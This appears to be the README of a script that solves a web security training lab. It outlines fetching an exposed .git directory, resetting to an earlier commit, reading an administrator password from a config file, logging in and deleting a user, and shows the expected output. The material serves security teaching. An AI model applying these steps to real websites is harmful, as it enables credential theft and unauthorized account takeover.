## Hack Steps

1. Fetch the .git directory
2. Reset to the previous commit
3. Get the administrator password from the admin.conf file
4. Login as administrator
5. Delete carlos

## Run Script

1. Change the domain of the lab
2. Make sure that **wget** and **git** are installed on your system
3. Start script

```
~$ python main.py
```

## Expected Output

```
⦗1⦘ Fetching .git directory (wait a minute).. OK
                ............
⦗2⦘ Changing current working directory.. OK
HEAD is now at 3c05f9c Add skeleton admin panel
⦗3⦘ Resetting to the previous commit.. OK
⦗4⦘ Reading admin.conf file.. OK
⦗5⦘ Extracting the administrator password.. OK => wg9ypbuxnz4ffq38bdau
⦗6⦘ Fetching the login page to get a valid session and csrf token.. OK
⦗7⦘ Logging in as administrator.. OK
⦗8⦘ Deleting carlos.. OK
🗹 The lab should be marked now as solved
```
